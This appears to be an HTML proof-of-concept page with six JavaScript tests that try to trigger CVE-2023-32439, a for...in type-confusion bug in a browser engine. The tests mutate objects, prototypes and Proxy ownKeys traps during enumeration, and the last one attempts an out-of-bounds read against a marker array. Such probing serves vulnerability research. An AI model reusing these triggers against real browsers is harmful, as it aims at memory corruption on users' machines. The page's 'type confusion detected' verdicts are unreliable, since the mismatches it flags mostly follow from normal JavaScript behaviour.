<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CVE-2023-32439 - for...in Type Confusion Test</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 700px; overflow-y: auto; }
        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px; cursor: pointer; font-size: 15px; font-weight: bold; }
        .log { padding: 4px 0; font-size: 12px; }
        .success { color: #0f0; font-weight: bold; }
        .fail { color: #f00; font-weight: bold; }
        .warn { color: #ff0; font-weight: bold; }
        .info { color: #0ff; }
        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
    </style>
</head>
<body>
    <h1>🔥 CVE-2023-32439: for...in Type Confusion 🔥</h1>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <button class="btn" onclick="test1_basic()">Test 1: Basic for...in Confusion</button>
        <button class="btn" onclick="test2_proxy()">Test 2: Proxy Trap Confusion</button>
        <button class="btn" onclick="test3_prototype()">Test 3: Prototype Chain Mutation</button>
        <button class="btn" onclick="test4_delete()">Test 4: Delete During Enum</button>
        <button class="btn" onclick="test5_advanced()">Test 5: Advanced Type Confusion</button>
        <button class="btn" onclick="test6_oob()">Test 6: OOB Access Attempt</button>
    </div>
    
    <div class="section">
        <div class="title">📋 Test Results</div>
        <div id="log"></div>
    </div>

<script>
function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = msg;
    document.getElementById('log').appendChild(div);
}

function sep() {
    log('═'.repeat(80), 'info');
}

function hex(val) {
    if (typeof val === 'number') {
        return '0x' + val.toString(16);
    }
    return String(val);
}

// ============================================
// TEST 1: BASIC FOR...IN CONFUSION
// ============================================
function test1_basic() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('TEST 1: Basic for...in Type Confusion', 'critical');
    sep();
    log('', '');
    
    log('[*] Testing basic object mutation during enumeration...', 'info');
    log('', '');
    
    try {
        var obj = {a: 1, b: 2, c: 3};
        var keys = [];
        var iteration = 0;
        
        log('[1] Starting enumeration...', 'info');
        
        for (var key in obj) {
            iteration++;
            keys.push(key);
            log('  Iteration ' + iteration + ': key=' + key + ', obj[' + key + ']=' + obj[key], '');
            
            // Mutate object during iteration
            if (iteration === 2) {
                log('  [!] Mutating object: deleting "c", adding "d"', 'warn');
                delete obj.c;
                obj.d = 4;
                obj.e = 5;
            }
        }
        
        log('', '');
        log('[2] Enumeration complete', 'info');
        log('  Keys seen: ' + keys.join(', '), 'success');
        log('  Total iterations: ' + iteration, 'success');
        log('  Final object keys: ' + Object.keys(obj).join(', '), 'info');
        
        if (iteration !== Object.keys(obj).length) {
            log('', '');
            log('⚠️ MISMATCH DETECTED!', 'critical');
            log('  Enumeration count != final key count', 'critical');
            log('  This could indicate enumerator bug!', 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
        log('Stack: ' + e.stack, 'fail');
    }
    
    sep();
}

// ============================================
// TEST 2: PROXY TRAP CONFUSION
// ============================================
function test2_proxy() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('TEST 2: Proxy Trap Type Confusion', 'critical');
    sep();
    log('', '');
    
    log('[*] CVE-2023-32439 Core: Proxy modifies object during enumeration', 'info');
    log('', '');
    
    try {
        var base = {a: 1, b: 2, c: 3};
        var trapCalled = 0;
        
        log('[1] Creating Proxy with ownKeys trap...', 'info');
        
        var proxy = new Proxy(base, {
            ownKeys: function(target) {
                trapCalled++;
                log('  [!] ownKeys trap called (call #' + trapCalled + ')', 'warn');
                log('  [!] Before mutation: ' + Object.keys(target).join(', '), '');
                
                // CRITICAL: Mutate base object during enumeration
                delete base.b;
                base.d = 4;
                base.e = 5;
                base.f = 6;
                
                log('  [!] After mutation: ' + Object.keys(target).join(', '), 'warn');
                
                return Reflect.ownKeys(target);
            }
        });
        
        log('', '');
        log('[2] Enumerating proxy...', 'info');
        
        var keys = [];
        for (var key in proxy) {
            keys.push(key);
            log('  Saw key: ' + key + ' = ' + proxy[key], '');
        }
        
        log('', '');
        log('[3] Results:', 'info');
        log('  Trap called: ' + trapCalled + ' times', 'success');
        log('  Keys enumerated: ' + keys.join(', '), 'success');
        log('  Actual keys in base: ' + Object.keys(base).join(', '), 'info');
        
        if (keys.length !== Object.keys(base).length) {
            log('', '');
            log('⚠️⚠️ TYPE CONFUSION DETECTED! ⚠️⚠️', 'critical');
            log('  Enumerator size mismatch!', 'critical');
            log('  Expected: ' + Object.keys(base).length, 'critical');
            log('  Got: ' + keys.length, 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
        log('Stack: ' + e.stack, 'fail');
    }
    
    sep();
}

// ============================================
// TEST 3: PROTOTYPE CHAIN MUTATION
// ============================================
function test3_prototype() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('TEST 3: Prototype Chain Mutation During Enumeration', 'critical');
    sep();
    log('', '');
    
    log('[*] Testing prototype modification during for...in', 'info');
    log('', '');
    
    try {
        var proto = {x: 10, y: 20};
        var obj = Object.create(proto);
        obj.a = 1;
        obj.b = 2;
        
        log('[1] Initial state:', 'info');
        log('  Own properties: ' + Object.keys(obj).join(', '), '');
        log('  Prototype properties: ' + Object.keys(proto).join(', '), '');
        log('', '');
        
        log('[2] Enumerating with prototype mutation...', 'info');
        
        var iteration = 0;
        for (var key in obj) {
            iteration++;
            log('  Iteration ' + iteration + ': ' + key + ' = ' + obj[key], '');
            
            // Mutate prototype during iteration
            if (iteration === 2) {
                log('  [!] Modifying prototype!', 'warn');
                delete proto.y;
                proto.z = 30;
                proto.w = 40;
            }
        }
        
        log('', '');
        log('[3] Final state:', 'info');
        log('  Total iterations: ' + iteration, 'success');
        log('  Expected: ' + (Object.keys(obj).length + Object.keys(proto).length), 'info');
        
        if (iteration !== (Object.keys(obj).length + Object.keys(proto).length)) {
            log('', '');
            log('⚠️ ENUMERATOR SIZE MISMATCH!', 'critical');
            log('  Possible JSPropertyNameEnumerator bug!', 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
    }
    
    sep();
}

// ============================================
// TEST 4: DELETE DURING ENUMERATION
// ============================================
function test4_delete() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('TEST 4: Aggressive Property Deletion', 'critical');
    sep();
    log('', '');
    
    log('[*] Delete properties while enumerating...', 'info');
    log('', '');
    
    try {
        var obj = {};
        for (var i = 0; i < 100; i++) {
            obj['prop' + i] = i;
        }
        
        log('[1] Created object with 100 properties', 'info');
        log('', '');
        
        log('[2] Enumerating and deleting...', 'info');
        var seen = 0;
        var deleted = 0;
        
        for (var key in obj) {
            seen++;
            if (seen % 2 === 0) {
                delete obj[key];
                deleted++;
            }
        }
        
        log('', '');
        log('[3] Results:', 'info');
        log('  Properties seen: ' + seen, 'success');
        log('  Properties deleted: ' + deleted, 'warn');
        log('  Properties remaining: ' + Object.keys(obj).length, 'info');
        
        var expected = 100 - deleted;
        if (Object.keys(obj).length !== expected) {
            log('', '');
            log('⚠️ UNEXPECTED COUNT!', 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
    }
    
    sep();
}

// ============================================
// TEST 5: ADVANCED TYPE CONFUSION
// ============================================
function test5_advanced() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('TEST 5: Advanced Type Confusion Attack', 'critical');
    sep();
    log('', '');
    
    log('[*] Complex scenario: Proxy + Prototype + Mutation', 'info');
    log('', '');
    
    try {
        // Create a complex prototype chain
        var proto2 = {z1: 100, z2: 200};
        var proto1 = Object.create(proto2);
        proto1.y1 = 10;
        proto1.y2 = 20;
        
        var base = Object.create(proto1);
        base.a = 1;
        base.b = 2;
        
        log('[1] Created 3-level prototype chain', 'info');
        log('  base: ' + Object.keys(base).join(', '), '');
        log('  proto1: ' + Object.keys(proto1).join(', '), '');
        log('  proto2: ' + Object.keys(proto2).join(', '), '');
        log('', '');
        
        var mutations = 0;
        
        var proxy = new Proxy(base, {
            ownKeys: function(target) {
                mutations++;
                log('[2] ownKeys trap #' + mutations, 'warn');
                
                // Mutate all levels
                delete base.b;
                base.c = 3;
                
                delete proto1.y2;
                proto1.y3 = 30;
                
                delete proto2.z2;
                proto2.z3 = 300;
                
                log('  Mutated all prototype levels!', 'warn');
                
                return Reflect.ownKeys(target);
            },
            get: function(target, prop) {
                if (mutations > 0 && prop === 'c') {
                    log('  [!] Accessing newly added property "c"', 'critical');
                }
                return target[prop];
            }
        });
        
        log('', '');
        log('[3] Enumerating proxy...', 'info');
        
        var keys = [];
        for (var key in proxy) {
            keys.push(key);
            log('  ' + key + ' = ' + proxy[key], '');
        }
        
        log('', '');
        log('[4] Analysis:', 'info');
        log('  Keys seen: ' + keys.length, 'success');
        log('  Mutations triggered: ' + mutations, 'warn');
        
        // Check if we accessed the mutated property
        if (keys.indexOf('c') !== -1) {
            log('', '');
            log('✓✓ ACCESSED MUTATED PROPERTY!', 'critical');
            log('  This proves enumerator cached old structure!', 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
        log('Stack: ' + e.stack, 'fail');
    }
    
    sep();
}

// ============================================
// TEST 6: OOB ACCESS ATTEMPT
// ============================================
function test6_oob() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('TEST 6: Out-of-Bounds Access via Enumerator Bug', 'critical');
    sep();
    log('', '');
    
    log('[*] Attempting to trigger OOB read via size mismatch', 'info');
    log('', '');
    
    try {
        // Create victim array to detect OOB
        var victim = new Uint32Array(0x100);
        for (var i = 0; i < victim.length; i++) {
            victim[i] = 0xDEADBEEF;
        }
        
        log('[1] Created victim array with marker 0xDEADBEEF', 'info');
        log('', '');
        
        // Create object with properties
        var obj = {};
        for (var i = 0; i < 50; i++) {
            obj['prop' + i] = i;
        }
        
        log('[2] Created target object with 50 properties', 'info');
        log('', '');
        
        var enumCount = 0;
        var proxy = new Proxy(obj, {
            ownKeys: function(target) {
                // Massively expand object during enumeration
                for (var i = 50; i < 200; i++) {
                    target['prop' + i] = i;
                }
                log('[3] Expanded object from 50 to 200 properties!', 'warn');
                return Reflect.ownKeys(target);
            }
        });
        
        log('', '');
        log('[4] Enumerating...', 'info');
        
        for (var key in proxy) {
            enumCount++;
            // Try to access beyond original enumerator size
            if (enumCount > 50) {
                var val = proxy[key];
                if (typeof val === 'number' && val > 1000) {
                    log('  [!] Unexpected value at ' + key + ': ' + hex(val), 'critical');
                }
            }
        }
        
        log('', '');
        log('[5] Results:', 'info');
        log('  Properties enumerated: ' + enumCount, 'success');
        log('  Expected (old size): 50', 'info');
        log('  Actual (new size): 200', 'info');
        
        if (enumCount > 50) {
            log('', '');
            log('⚠️ ENUMERATED BEYOND ORIGINAL SIZE!', 'critical');
            log('  Enumerator may have used stale size!', 'critical');
        }
        
        // Check victim
        log('', '');
        log('[6] Checking victim array...', 'info');
        var corrupted = false;
        for (var i = 0; i < victim.length; i++) {
            if (victim[i] !== 0xDEADBEEF) {
                log('  Victim[' + i + '] corrupted: ' + hex(victim[i]), 'critical');
                corrupted = true;
            }
        }
        
        if (!corrupted) {
            log('  Victim intact (no corruption)', 'success');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
        log('Stack: ' + e.stack, 'fail');
    }
    
    sep();
}

</script>
</body>
</html>
